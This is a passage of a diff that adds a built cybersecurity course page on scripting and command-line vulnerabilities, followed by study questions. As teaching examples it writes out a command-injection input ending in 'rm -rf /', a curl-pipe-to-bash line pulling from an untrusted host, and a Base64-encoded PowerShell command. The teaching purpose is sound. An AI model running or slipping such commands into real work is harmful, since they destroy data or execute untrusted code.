+<td>Permission: Must be executable (run <code>chmod +x file.sh</code>) <br>Run: Must use <code>./file.sh</code> (Security feature).</td>
+</tr>
+<tr>
+<td>CMD (Legacy)</td>
+<td><code>myfile.bat</code> <code>myfile.cmd</code></td>
+<td><code>@echo off</code><br>(optional)</td>
+<td><strong>Run</strong>: Type the filename (e.g., <code>myfile.bat</code>).</td>
+</tr>
+<tr>
+<td>PowerShell</td>
+<td><code>myfile.ps1</code></td>
+<td>None</td>
+<td><strong>Policy</strong>: Blocked by default. Enable with, e.g., <code>Set-ExecutionPolicy X</code>. <br><strong>Run</strong>: Must use <code>.\file.ps1</code> (Like Bash).</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>[!note] Note: The Shebang (#!)
+In Unix/Bash, the first line <code>#!/bin/bash</code> tells the <a href="Operating System.md">OS</a> which interpreter to use. You can change this to e.g. <code>#!/usr/bin/python</code> to write a Python script that behaves like a shell script.</p>
+</blockquote>
+<h1 id="vulnerabilities-in-the-command-line">Vulnerabilities in the Command Line<a class="headerlink" href="#vulnerabilities-in-the-command-line" title="Permanent link">&para;</a></h1>
+<h2 id="injection-and-unsafe-execution">Injection and Unsafe Execution<a class="headerlink" href="#injection-and-unsafe-execution" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>[!error] Shell Injection (Command Injection)
+Occurs when user input is passed unsanitized to a system command.</p>
+<ul>
+<li><strong>Vulnerable Code</strong>: <code>rm $filename</code></li>
+<li><strong>Malicious Input</strong>: <code>file.txt; rm -rf /</code></li>
+<li><strong>Result</strong>: The shell interprets the semicolon as “end of command” and
+executes the delete command next.</li>
+<li><strong>Fix</strong>: <code>rm "$filename"</code></li>
+</ul>
+<p>[!error] The “Curl — Bash” Anti-Pattern
+<code>curl http://untrusted.com/script.sh | bash</code></p>
+<ul>
+<li><strong>The Risk</strong>: You are executing code from the internet <strong>blindly</strong>.</li>
+<li><strong>The Fix</strong>: Download the script <em>first</em>, inspect the code (read it), and
+then (<em>maybe</em>) execute it.</li>
+</ul>
+</blockquote>
+<h2 id="operational-security">Operational Security<a class="headerlink" href="#operational-security" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>[!error] History File Leaks
+- Shells save command history to disk (e.g., <code>.bash_history</code>).
+- <strong>Danger</strong>: Typing secrets in flags.
+<code>mysql -pSecret123</code>
+- <strong>Result</strong>: Password is stored in plain text on the hard drive.
+- <strong>Fix</strong>: Use interactive prompts or environment variables.</p>
+<p>[!error] Path Hijacking
+- The <code>$PATH</code> variable controls where the shell looks for programs.
+- <strong>Danger</strong>: Adding <code>.</code> (current directory) to the start of PATH (or in the
+path at all).
+- <strong>Scenario</strong>: The attacker places a <a href="../../Terminology/Attacks/Malware/Virus/">virus</a> named ‘ls’ in a shared folder. You type <code>ls</code>, and the <a href="../../Terminology/Attacks/Malware/Virus/">virus</a> runs instead of the real command.</p>
+</blockquote>
+<h2 id="permission-laziness">Permission Laziness<a class="headerlink" href="#permission-laziness" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>[!error] The “<code>chmod 777</code>” trap
+- <strong>Action</strong>: Granting Read/Write/Execute permissions to <em>Everyone</em> to fix a “permission denied” error.
+- <strong>Risk</strong>: Any user (or hacked web service) can overwrite your scripts.
+- <strong>Scenario</strong>: Attacker modifies a startup script. When you reboot, their <a href="../../Terminology/Attacks/Malware/Malware/">Malware</a> runs with your admin privileges.</p>
+<p>[!error] Running as Root
+- <strong>Principle of Least Privilege</strong>: Always log in as a standard user; use <code>sudo</code> only when necessary.
+- <strong>The Typo Hazard</strong>: <code>rm -rf / home/foo/bar</code> (The space after the slash deletes the entire root directory).</p>
+</blockquote>
+<h2 id="tricks-and-obfuscation">Tricks and Obfuscation<a class="headerlink" href="#tricks-and-obfuscation" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>[!error] Unix: Wildcard Injection
+<strong>Concept</strong>: Filenames can look like Flags.
+1. Attacker creates a file named <code>-rf</code>.
+2. Admin runs <code>rm *</code> inside that folder.
+3. Shell expands <code>*</code> to: <code>file1 file2 -rf</code>.
+4. Command becomes: <code>rm file1 file2 -rf</code>.
+5. Result: <code>rm</code> forces a recursive delete instead of deleting the file named “-rf”.</p>
+<p>[!error] PowerShell Obfuscation
+Attackers hide malicious code in Base64-encoded strings to bypass text scanners.
+<code>PowerShell.exe -EncodedCommand ZWNobyAiaGFja2VkIg==</code></p>
+</blockquote>
+<h1 id="up-next">Up Next ..<a class="headerlink" href="#up-next" title="Permanent link">&para;</a></h1>
+<h2 id="further-studies-experiments">Further Studies / Experiments<a class="headerlink" href="#further-studies-experiments" title="Permanent link">&para;</a></h2>
+<ol>
+<li>How can you prevent wildcard injection attacks, such as the one with <code>rm *</code>
+shown in the slides?</li>
+<li><strong>The “Curl — Bash” Problem</strong>:<ul>
+<li>Find a recent example of a supply-chain attack where a remote script was compromised.</li>
+<li>If you must install software this way, what specific steps should you take to verify the script’s integrity before running it?</li>
+</ul>
+</li>
+<li><strong>Principle of Least Privilege</strong>:<ul>
+<li>Why is <code>sudo</code> safer than logging in as root directly?</li>
+<li>Research the concept of the “Audit Trail” in system logs. How does <code>sudo</code> help track who did what?</li>
+</ul>
+</li>
+<li><strong>Path Hijacking</strong>: Create a safe experiment on your own machine (or a
+VM):<ul>
+<li>Create a script named ‘ls’ in a local folder, modify your <code>$PATH</code>,
+and see if you can trick your shell into running it.</li>
+<li>How do modern OSs (Windows/Linux) try to prevent this by default?</li>
+</ul>
+</li>
+<li><strong>The Un-deletable File</strong>:<ul>
+<li>You have a file named ‘-i’.</li>
+<li>Every time you try to delete it (<code>rm -i</code>), the system asks you for confirmation, but even if you say yes, it doesn’t delete. Why?</li>
+<li>How do you fix it?</li>
+</ul>
+</li>
+</ol>
+<h2 id="lab-3">Lab 3<a class="headerlink" href="#lab-3" title="Permanent link">&para;</a></h2>
+<p>“Find your way through a randomly generated file tree using command-line tools and scripts.”</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/FuadPoroshtica/T-401-ICYB-CySec-Knowledge-Base" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
